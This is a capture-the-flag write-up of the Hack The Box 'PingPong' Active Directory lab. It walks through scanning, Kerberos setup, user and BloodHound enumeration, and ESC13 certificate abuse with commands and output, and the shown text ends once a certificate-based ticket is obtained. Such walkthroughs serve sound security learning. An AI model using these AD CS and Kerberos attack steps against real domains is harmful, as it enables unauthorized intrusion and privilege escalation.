---
title: PingPong
date: 2026-8-31
excerpt: Hack The Box - Insane
cover: ../uploads/cover_pingpong.jpg
tags: Kerberos-Only Environment, ADCS, Cross-Forest Trust, gMSA, RBCD, MSSQL
---

Welcome back to another Hack The Box writeup! In this walkthrough, I'll be documenting my step-by-step approach to solving **PingPong**, an **Insane-rated Windows machine** released as part of Hack The Box Season 10.

Unlike a typical standalone Windows box, PingPong is heavily focused on **Active Directory and multi-forest environments**. The machine features two Active Directory forests, `PING.HTB` and `PONG.HTB`, connected through a trust relationship, making the attack path much more complex than simply obtaining an initial foothold and escalating privileges on a single host.

What makes PingPong particularly interesting is that the entire attack chain revolves around advanced Active Directory concepts, including **Kerberos-only authentication, cross-forest trust relationships, gMSA abuse, delegation, MSSQL, Resource-Based Constrained Delegation (RBCD), and Active Directory Certificate Services (AD CS)**. NTLM is disabled in the environment, which means many traditional AD attack techniques and authentication methods are unavailable, forcing us to work primarily with Kerberos.

The machine also introduces several challenges that can easily become roadblocks if overlooked, particularly **Kerberos time synchronization and cross-domain authentication**. Understanding how authentication flows between the two forests is therefore just as important as finding individual vulnerabilities.

In this writeup, I'll break down the entire attack path — from the initial enumeration and foothold, through lateral movement between the two domains, privilege escalation, and finally obtaining **Domain Administrator** access. Along the way, I'll explain not only *what* commands are being used, but also *why* each technique works and how the different Active Directory misconfigurations can be chained together.

So, without further ado, let's dive into **PingPong** and see how we can turn a seemingly limited foothold into complete domain compromise.

## Techniques Used

Four core Active Directory attack techniques anchor this entire chain:

1. **Kerberos-only authentication abuse** — with NTLM disabled domain-wide, every step (TGT requests, service tickets, `.ccache` files, AES keys) has to go through Kerberos, including across the forest trust.
2. **AD CS misconfiguration abuse (ESC13 and ESC4 → ESC1)** — certificate templates are abused twice: once to gain an initial foothold via a group-linked issuance policy (ESC13), and again at the very end by using delegated template control to build an ESC1-style template from scratch (ESC4).
3. **gMSA password/group-scope abuse** — converting an inherited **ownership** relationship on a group into full control, then abusing Active Directory's group-scope conversion rules to legally read a Group Managed Service Account's password cross-forest.
4. **Resource-Based Constrained Delegation (RBCD) and S4U2Self/S4U2Proxy abuse** — using control over a computer/gMSA account to impersonate a higher-privileged user against an MSSQL service, followed by `xp_cmdshell` and a **SeImpersonatePrivilege** ("Potato") escalation to SYSTEM.

# Phase 1 — Reconnaissance

## Initial Nmap Scan

Let's begin by performing an `Nmap` scan to enumerate the target's exposed services and identify potential entry points for further exploitation.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nmap -A -T5 10.129.245.56
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-31 06:57 EDT
Warning: 10.129.245.56 giving up on port because retransmission cap hit (2).
Stats: 0:01:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 06:59 (0:00:04 remaining)
Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 06:59 (0:00:00 remaining)
Nmap scan report for dc1.ping.htb (10.129.245.56)
Host is up (0.27s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-31 22:04:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-31T22:05:26
|_  start_date: N/A
|_clock-skew: 11h06m10s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   318.56 ms 10.10.14.1
2   318.61 ms dc1.ping.htb (10.129.245.56)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.95 seconds
```

This is an aggressive Nmap scan against `10.129.245.56`. The `-A` flag bundles several detection features together — **OS fingerprinting, service/version detection, default NSE scripts, and traceroute** — so we get a much richer picture than a plain port scan would give us. `-T5` pushes Nmap to its fastest ("Insane") timing template, trading some reliability for speed on what looks like a stable, low-latency lab network.

The results immediately tell us we're dealing with a **Windows Domain Controller** named `dc1.ping.htb`. The open ports read like a checklist of core Active Directory services: **DNS (53)**, **Kerberos (88)**, **LDAP (389/636)**, **SMB (445)**, **Kerberos password change (464)**, **Global Catalog LDAP (3268/3269)**, and **WinRM (5985)**. The certificate subject alternative names on the LDAPS services confirm the domain name `ping.htb`, and the SMB host script results show that **SMB signing is enabled and required** — a hardening measure that will rule out several classic NTLM-relay attacks later on. One detail worth flagging early: the `clock-skew` field reports **11 hours 6 minutes** of difference between our attacking machine and the DC. Because Kerberos tickets are time-bound, this skew will need to be corrected before any Kerberos authentication will succeed.

With the Domain Controller identified as `dc1.ping.htb` (domain `ping.htb`, NetBIOS name `PING`), we add all three names to `/etc/hosts` so that Kerberos-aware tooling can resolve them consistently instead of relying on the bare IP address.

## Credential Validation over SMB/LDAP

The challenge also hands us an assumed-breach credential pair to start from:

`c.roberts : AssumedBreach123`

Having a valid, low-privileged account from the start means we can skip external enumeration and go straight into authenticated Active Directory reconnaissance — a more realistic simulation of an attacker who has already phished or purchased a foothold.

We first sanity-check these credentials against **SMB** and **LDAP** using `NetExec` (`nxc`).

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nxc smb ping.htb -u c.roberts -p AssumedBreach123 
SMB         10.129.245.56   445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)                                                                                                                        
SMB         10.129.245.56   445    dc1              [-] ping.htb\c.roberts:AssumedBreach123 STATUS_NOT_SUPPORTED

┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nxc ldap ping.htb -u c.roberts -p AssumedBreach123
LDAP        10.129.245.56   389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:None) (channel binding:Never) (NTLM:False)                                                                                                             
LDAP        10.129.245.56   389    DC1              [-] ping.htb\c.roberts:AssumedBreach123 STATUS_NOT_SUPPORTED
```

Both attempts fail with `STATUS_NOT_SUPPORTED` rather than an authentication failure — a meaningful distinction. This status doesn't mean the password is wrong; it means the **authentication mechanism itself** (NTLM, in this case) isn't available on the server. Combined with the `(NTLM:False)` flag NetExec reports for both services, this confirms that the environment has deliberately disabled NTLM, forcing every authenticated interaction through **Kerberos** instead. This single design choice shapes the rest of the entire attack chain: pass-the-hash, NTLM relaying, and many "quick win" AD tools are simply off the table here.

# Phase 2 — Establishing a Kerberos Foothold

## Kerberos Configuration & Time Sync

Since NTLM is disabled, our first job is to get Kerberos working end-to-end. `NetExec` can generate a ready-to-use `krb5.conf` for us directly from the target, saving us from hand-writing the realm and KDC mappings.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nxc smb ping.htb --generate-krb5-file ./krb5.conf
SMB         10.129.245.56   445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.245.56   445    dc1              [+] krb5 conf saved to: ./krb5.conf
SMB         10.129.245.56   445    dc1              [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5.conf

┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ export KRB5_CONFIG=./krb5.conf
```

Kerberos is intentionally strict about time: every ticket carries timestamps, and the KDC will reject requests if the client's clock has drifted too far from its own (by default, more than 5 minutes). The `clock-skew: 11h06m10s` we saw during the Nmap scan is well outside that tolerance, so before requesting any tickets we need to synchronize our clock against the DC using `ntpdate`.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ sudo ntpdate -u ping.htb
[sudo] password for kuroshiro: 
2026-08-31 18:09:37.545997 (-0400) +39971.628429 +/- 0.048006 ping.htb 10.129.245.56 s1 no-leap
CLOCK: time stepped by 39971.628429
```

The clock is stepped forward by roughly **39,972 seconds (≈ 11.1 hours)**, which lines up exactly with the skew reported earlier. With our clock and the DC's clock now in agreement, Kerberos ticket exchanges will no longer fail on time-validity checks.

## Requesting the Initial TGT

With time synced, we can request a **Kerberos Ticket Granting Ticket (TGT)** for `c.roberts` using `impacket-getTGT`. A TGT is the "master key" of a Kerberos session: once obtained, it lets us request service tickets for individual resources (LDAP, HTTP, CIFS, etc.) without ever handling the password again.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ impacket-getTGT 'PING.HTB/c.roberts:AssumedBreach123'    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.roberts.ccache
```

The ticket is written to `c.roberts.ccache`. Pointing `KRB5CCNAME` at this file tells any Kerberos-aware tool where to find our cached credentials, letting us authenticate without supplying a password on every command.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ export KRB5CCNAME=c.roberts.ccache
```

## Domain User Enumeration

We can now query LDAP using the cached ticket instead of a password, via NetExec's `--use-kcache` flag. The `--users-export` option additionally dumps the enumerated usernames to a local file for later use.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nxc ldap ping.htb -u c.roberts --use-kcache --users-export users.txt
LDAP        ping.htb        389    DC1              [*] None (name:DC1) (domain:PING.HTB) (signing:None) (channel binding:Never) (NTLM:False)                                                                                                             
LDAP        ping.htb        389    DC1              [+] PING.HTB\c.roberts from ccache 
LDAP        ping.htb        389    DC1              [*] Enumerated 25 domain users: PING.HTB
LDAP        ping.htb        389    DC1              -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                                            
LDAP        ping.htb        389    DC1              Administrator                 2026-02-03 04:42:36 0        Built-in account for administering the computer/domain                                                                   
LDAP        ping.htb        389    DC1              Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                 
LDAP        ping.htb        389    DC1              krbtgt                        2025-06-16 07:36:47 0        Key Distribution Center Service Account                                                                                  
LDAP        ping.htb        389    DC1              M.Russell                     2025-12-28 03:14:51 0        IT manager                                                                                                               
LDAP        ping.htb        389    DC1              G.Lorents                     2025-12-28 03:14:51 0        IT Support Specialist                                                                                                    
LDAP        ping.htb        389    DC1              Z.Iskam                       2025-12-28 03:14:51 0        IT Director                                                                                                              
LDAP        ping.htb        389    DC1              M.Wallace                     2025-12-28 03:14:51 0        Assurance Tester                                                                                                         
LDAP        ping.htb        389    DC1              P.Paul                        2025-12-28 03:14:52 0        Security Specialist                                                                                                      
LDAP        ping.htb        389    DC1              A.Gordon                      2025-12-28 03:14:52 0        Network Engineer                                                                                                         
LDAP        ping.htb        389    DC1              P.Klain                       2025-12-28 03:14:52 0        Senior IT Technician                                                                                                     
LDAP        ping.htb        389    DC1              C.Roberts                     2025-12-28 03:14:52 0        Junior IT Technician                                                                                                     
LDAP        ping.htb        389    DC1              S.Zhoski                      2026-01-17 09:42:20 0             
LDAP        ping.htb        389    DC1              R.Miller                      2026-01-17 09:42:20 0             
LDAP        ping.htb        389    DC1              A.Adam                        2026-01-17 09:42:20 0             
LDAP        ping.htb        389    DC1              R.Robins                      2026-01-17 09:42:20 0             
LDAP        ping.htb        389    DC1              P.Pollek                      2026-01-17 09:42:20 0             
LDAP        ping.htb        389    DC1              O.Plinski                     2026-01-17 09:42:20 0             
LDAP        ping.htb        389    DC1              V.Vodomir                     2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              D.MacKenzie                   2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              P.Vandeval                    2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              T.Yang                        2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              N.Neri                        2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              W.Williams                    2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              K.Podroski                    2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              G.James                       2026-01-17 09:42:21 0             
LDAP        ping.htb        389    DC1              [*] Writing 25 local users to users.txt
```

Authentication succeeds using nothing but the Kerberos ticket, and LDAP hands back **25 domain accounts** — the usual built-ins (`Administrator`, `Guest`, `krbtgt`) plus a roster of named employee accounts. This user list becomes useful later as a reference point when BloodHound starts surfacing group memberships and relationships.

# Phase 3 — Active Directory Enumeration with BloodHound

## Collecting Data with RustHound-CE

With Kerberos authentication working, we move to full-scale AD enumeration using `RustHound-CE`, a fast Rust reimplementation of the classic BloodHound collector.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ rusthound-ce -d ping.htb -u c.roberts@ping.htb -k -f dc1.ping.htb -i 10.129.245.56 -n 10.129.245.56 --dns-tcp --ldaps -z
---------------------------------------------------
Initializing RustHound-CE at 18:51:09 on 08/31/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-08-31T22:51:09Z INFO  rusthound_ce] Verbosity level: Info
[2026-08-31T22:51:09Z INFO  rusthound_ce] Collection method: All
[2026-08-31T22:51:10Z INFO  rusthound_ce::ldap] Connected to PING.HTB Active Directory!
[2026-08-31T22:51:10Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-08-31T22:51:10Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T22:51:18Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=ping,DC=htb
[2026-08-31T22:51:18Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T22:51:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ping,DC=htb
[2026-08-31T22:51:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T22:51:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=ping,DC=htb
[2026-08-31T22:51:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T22:51:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=ping,DC=htb
[2026-08-31T22:51:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T22:51:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=ping,DC=htb
[2026-08-31T22:51:22Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠐ Parsing LDAP objects: 54%                                                                                         [2026-08-31T22:51:22Z INFO  rusthound_ce::objects::enterpriseca] Found 13 enabled certificate templates             
[2026-08-31T22:51:22Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-08-31T22:51:22Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-08-31T22:51:22Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-08-31T22:51:22Z INFO  rusthound_ce::modules::sessions] [sessions] 0 active target(s) after expiry/enabled filter
[2026-08-31T22:51:22Z INFO  rusthound_ce::modules::sessions] [sessions] 0 session(s) enumerated in total across 0 host(s)
[2026-08-31T22:51:22Z INFO  rusthound_ce::modules] Starting ESC8 web enrollment probe on 1 CA(s)...
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 28 users parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 65 groups parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 2 domains parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 35 certtemplates parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] 4 issuancepolicies parsed!
[2026-08-31T22:51:28Z INFO  rusthound_ce::json::maker::common] .//20260831185128_ping-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 18:51:28 on 08/31/26! Happy Graphing!
```

RustHound-CE walks every relevant LDAP naming context — the domain partition, the configuration partition, the schema, and the DNS zones — and converts what it finds into BloodHound-compatible JSON. Along the way it surfaces **28 users, 65 groups, 1 computer, 2 domains, 3 GPOs, and 35 certificate templates (13 of them enabled)**. The fact that it also runs an automatic **ESC8 web-enrollment probe** is a strong hint that AD CS misconfigurations are meant to play a central role in this box — certificate services are frequently a shortcut around otherwise well-hardened Kerberos/NTLM defenses.

The collected data is bundled into a ZIP archive that we import directly into BloodHound for graph-based analysis.

## Mapping the Cross-Forest Trust

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfrjmRxvA2lNkaj1502R9%252FScreenshot%2520%283194%29.png%3Falt%3Dmedia%26token%3D1ee97e72-18f3-4a7d-bcfe-8f6e7cbd7d22&width=768&dpr=3&quality=100&sign=00ca45ec539b96558d74faa56a7a31ff&sv=3)

This graph shows a **one-way `CrossForestTrust`** edge running from `PING.HTB` to `PONG.HTB`. In plain terms, `PING.HTB` trusts `PONG.HTB`, meaning that (subject to SID filtering and selective authentication settings) principals authenticated in `PONG.HTB` can be granted access to resources in `PING.HTB` — and, as we'll see, the reverse direction can also matter depending on which group memberships and delegated rights cross the boundary. This is the structural feature that turns PingPong into a two-forest puzzle rather than a single-domain box.

Here are the two forests' Domain SIDs for reference, since we'll be resolving foreign security principals by SID throughout this writeup:

```text
PING.htb
S-1-5-21-750635624-2058721901-1932338391

PONG.htb
S-1-5-21-2410575906-3092493790-2123333151
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FF12joRV9bSnMqAWOpuV8%252FScreenshot%2520%283195%29.png%3Falt%3Dmedia%26token%3D0f19062b-5c2f-4e7c-a4ad-ab1892d0d923&width=768&dpr=3&quality=100&sign=9aee0ba24e110d8258d560fea42685a3&sv=3)

BloodHound confirms `c.roberts` is a member of the **IT** group. Group memberships like this are exactly what BloodHound is built to surface — a seemingly ordinary membership can turn into an entire attack path once we trace what rights that group holds elsewhere in the forest.

## Certificate Template Enumeration

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FtIKz9F7YuwL2ZHcbKKAS%252FScreenshot%2520%283197%29.png%3Falt%3Dmedia%26token%3Dfc3bdd05-4d60-4ee1-b67e-55ffac000048&width=768&dpr=3&quality=100&sign=fffd03e71c693e27c33d384a2aa43b4c&sv=3)

This view highlights AD CS enrollment rights for **Domain Users** in `PING.HTB`. The group has **Enroll** permissions on several templates (`TemporaryWinRM`, `EFS`, `ClientAuth`, `UserSignature`, `User`) and is itself a member of **Authenticated Users**, which holds Enroll rights on the Enterprise CA (`PING-DC1-CA`) — the permission needed just to talk to the CA at all. Since `c.roberts` is a member of Domain Users, this account can request a certificate from the `TemporaryWinRM` template, which immediately becomes our first concrete lead for gaining code execution.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fgrrink1gU3jcXc02BVdI%252FScreenshot%2520%283198%29.png%3Falt%3Dmedia%26token%3D967cf331-1ebc-4bd8-b225-e9770398bbee&width=768&dpr=3&quality=100&sign=5d48b322d68f4f947e788c1dc6825d5c&sv=3)

The **CA Managers@PING.HTB** group is also worth noting for later: it contains two local `PING.HTB` accounts (`M.Wallace`, `P.Paul`) and, more interestingly, a **foreign security principal** from `PONG.HTB` (SID ending in `-1124`). A foreign principal being granted membership in a group that manages the certificate authority is a strong hint that the final leg of this attack loops back through AD CS — we just don't have enough context yet to use it.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOljhyrwNGkGfkxAfWlun%252FScreenshot%2520%283199%29.png%3Falt%3Dmedia%26token%3D91222685-05d7-4c26-8372-2346226508e4&width=768&dpr=3&quality=100&sign=57d9f359534c6bc54f043a61624f8bd9&sv=3)

Crucially, **CA Managers** holds **WriteOwner** (plus **WriteDacl** and **GenericWrite**) over the `SmartcardAuthentication` certificate template. Any member of CA Managers can therefore seize ownership of that template, rewrite its ACL, and reconfigure it into something exploitable — this is the classic **ESC4** primitive (control over a template's security descriptor), and it's the mechanism that eventually gets abused to mint a Domain Admin certificate. Putting the pieces together, the overall shape of the attack is now visible: gain a foothold in `PING.HTB` through AD CS, pivot across the forest trust into `PONG.HTB`, and eventually work back to `PING.HTB`'s AD CS infrastructure for the final escalation.

Let's start by examining `TemporaryWinRM` more closely, since it's the template we can already enroll in. We use `certipy-ad find` to enumerate every certificate template and CA in detail.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ certipy-ad find -u 'c.roberts@ping.htb' -k -target dc1.ping.htb -dc-ip 10.129.245.56 -enabled
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'ping-DC1-CA' via RRP
[-] Failed to connect to remote registry: [Errno Connection error (192.168.2.1:445)] timed out
[-] Use -debug to print a stacktrace
[!] Failed to get CA configuration for 'ping-DC1-CA' via RRP: 'NoneType' object has no attribute 'request'
[!] Use -debug to print a stacktrace
[!] Could not retrieve configuration for 'ping-DC1-CA'
[*] Checking web enrollment for CA 'ping-DC1-CA' @ 'dc1.ping.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260831183818_Certipy.txt'
[*] Wrote text output to '20260831183818_Certipy.txt'
[*] Saving JSON output to '20260831183818_Certipy.json'
[*] Wrote JSON output to '20260831183818_Certipy.json'
```

Certipy confirms the **35 templates / 13 enabled** figures from RustHound-CE and dumps the full configuration to JSON for inspection. Let's look at the `TemporaryWinRM` entry:

```json
"1": {
      "Template Name": "TemporaryWinRM",
      "Display Name": "Temporary WinRM",
      "Certificate Authorities": [
        "ping-DC1-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": false,
      "Certificate Name Flag": [
        33554432,
        2147483648
      ],
      "Enrollment Flag": [
        1,
        8,
        32
      ],
      "Private Key Flag": [
        16
      ],
      "Extended Key Usage": [
        "Client Authentication",
        "Secure Email",
        "Encrypting File System"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 2,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2025-12-23 17:19:28+00:00",
      "Template Last Modified": "2025-12-27 21:12:15+00:00",
      "Issuance Policies": [
        "1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623"
      ],
      "Linked Groups": [
        "CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb"
      ],
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Domain Users",
            "PING.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "PING.HTB\\Administrator",
          "Full Control Principals": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "PING.HTB\\Domain Admins",
            "PING.HTB\\Domain Users",
            "PING.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "PING.HTB\\Domain Users"
      ],
      "[!] Vulnerabilities": {
        "ESC13": "Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'."
      }
    }
```

Certipy flags this directly as **ESC13**. To understand why: templates can carry an **Issuance Policy** OID, and Active Directory lets an issuance policy be linked to a security group. Any certificate issued from a template carrying that policy causes services that check the policy (rather than group membership directly) to treat the certificate holder *as if* they belonged to the linked group — here, `TempWinRMAccess`. Because `TemporaryWinRM` also allows **Client Authentication** and is enrollable by `Domain Users`, any domain user (including `c.roberts`) can request a certificate that effectively grants the rights of `TempWinRMAccess`, without ever being added to that group through normal means.

# Phase 4 — Initial Access via AD CS (ESC13)

## Requesting and Using the Certificate

We test the theory by requesting a certificate from `TemporaryWinRM` using Kerberos authentication.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ certipy-ad req -target dc1.ping.htb -target-ip 10.129.245.56 -dc-ip 10.129.245.56 -u 'c.roberts@ping.htb' -k -ca 'PING-DC1-CA' -template 'TemporaryWinRM' 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Saving certificate and private key to 'c.roberts.pfx'
[*] Wrote certificate and private key to 'c.roberts.pfx'
```

The CA happily issues a certificate for `C.Roberts@ping.htb`, bundled with its private key in `c.roberts.pfx`. This gives us a second, independent authentication factor for the account that doesn't rely on the original password at all.

We then use `certipy-ad auth` to convert that certificate into a Kerberos TGT — this is the PKINIT flow, where a certificate substitutes for a password during the initial Kerberos exchange.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ certipy-ad auth -pfx 'c.roberts.pfx' -domain ping.htb -dc-ip 10.129.245.56 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
